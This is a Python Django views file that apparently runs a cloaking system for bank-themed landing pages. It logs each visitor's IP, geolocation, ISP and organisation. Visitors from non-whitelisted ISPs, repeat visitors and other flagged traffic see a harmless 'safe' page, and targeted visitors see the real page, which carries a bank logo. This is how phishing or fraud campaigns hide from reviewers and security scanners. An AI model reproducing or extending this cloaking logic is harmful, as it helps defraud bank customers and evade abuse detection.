import os.path
import random
import datetime

from django.shortcuts import render_to_response, HttpResponse, get_object_or_404
from django.core.urlresolvers import reverse
from django.conf import settings
from pygeoip import GeoIP, GeoIPError, MEMORY_CACHE

from website.models import Keyword, Visitor, LandingPage, ISPWhiteList
from website.helpers import generate_subid, legitimate_visitor
from website import settings as app_settings


geoip = GeoIP(settings.GEOIP_DB_PATH)

orgs = GeoIP(os.path.join(settings.PROJECT_ROOT, 'shared', 'GeoIPOrg.dat'), MEMORY_CACHE)
isps = GeoIP(os.path.join(settings.PROJECT_ROOT, 'shared', 'GeoIPISP.dat'), MEMORY_CACHE)


def landing_page(request, keyword, lp='lp5'):
    subid = generate_subid()
    visitor = save_visitor(request, keyword, lp)
    visitor.text = subid
    visitor.referer = request.META.get('HTTP_REFERER', '')
    visitor.save()

    context = {
        'subid': subid,
        'next': reverse('website.views.unique_subid', args=[subid,]),
    }

    return render_to_response('lp.html', context)


def unique_subid(request, subid):

    visitor = get_object_or_404(Visitor, text=subid)

    ip = request.META.get('HTTP_X_REAL_IP', '')

    try:
        visitor_width = int(request.GET.get('w'))
    except (TypeError, ValueError):
        visitor_width = None

    try:
        visitor_height = int(request.GET.get('h'))
    except (TypeError, ValueError):
        visitor_height = None

    if visitor_width and visitor_height:
        visitor.viewport = '%s,%s' % (visitor_width, visitor_height)

    #if visitor_width > 1000:
    #    visitor.cloaked = True
    #    visitor.reason = 'viewport width'
    #    visitor.save()

    context = {
        'v': visitor,
        'logo': visitor.keyword.image.url,
        'bank': visitor.keyword,
        'subid': visitor.text,
    }

    day_ago = datetime.datetime.now()-datetime.timedelta(days=1)

    if visitor.visited and visitor.visit_datetime > day_ago:
        visitor.save()
        # One more visit, just showing safe page
        return render_to_response('%s/safe.html' % visitor.lp, context)

    # First hit in a day
    if visitor.country_code in ('EG', 'NL'):  # Allow Egypt and Netherlands always
        visitor.cloaked = False
        visitor.reason = ''

    visitor.visit_datetime = datetime.datetime.now()  # Saving last access time

    visitor.visited = True

    visitor.ip = ip
    try:
        visitor.organization = orgs.org_by_addr(ip)
    except GeoIPError:
        pass

    try:
        visitor.isp = isps.org_by_addr(ip)
    except GeoIPError:
        pass

    if not ISPWhiteList.objects.filter(name=visitor.isp).exists():
        visitor.cloaked = True

    visitor.save()

    lp = LandingPage.objects.get(name=visitor.lp)

    if visitor.cloaked:
        context['redirect_link'] = lp.random_safe_link()

        return render_to_response('%s/safe.html' % visitor.lp, context)

    context['redirect_link'] = lp.random_index_link()

    return render_to_response('%s/index.html' % visitor.lp, context)


def ip_details(request):
    # TODO: Shouldn't real IP be used here?
    ip =  request.META.get('HTTP_X_REAL_IP', '')
    ip = request.META['REMOTE_ADDR']
    ip = '93.174.93.224'
    geo_data = geoip.record_by_addr(ip)

    return HttpResponse(geo_data.items())


def save_visitor(request, keyword_text, lp):
    v = Visitor()
    v.visit_datetime = datetime.datetime.now()
    v.ip = request.META.get('HTTP_X_REAL_IP', '')
    v.ua = request.META['HTTP_USER_AGENT'][:100]
    keyword = get_object_or_404(Keyword, keyword=keyword_text)
    v.keyword = keyword
    v.lp = lp
    v.dt = datetime.datetime.now()
    try:
        geo_data = geoip.record_by_addr(str(v.ip))
    except GeoIPError:
        geo_data = geoip.record_by_addr('71.227.57.247')
    if geo_data is None:
        geo_data = {}

    v.city = geo_data.get('city','').lower()
    v.state = geo_data.get('region_name','')
    v.country_code = geo_data.get('country_code','')
    v.zip_code = geo_data.get('postal_code','')

    v.reason = legitimate_visitor(v.ip, geo_data, v)
    if v.reason: #Reason to cloak
        v.cloaked = True
    else:
        v.cloaked = False #no need to cloak

    v.save()

    return v
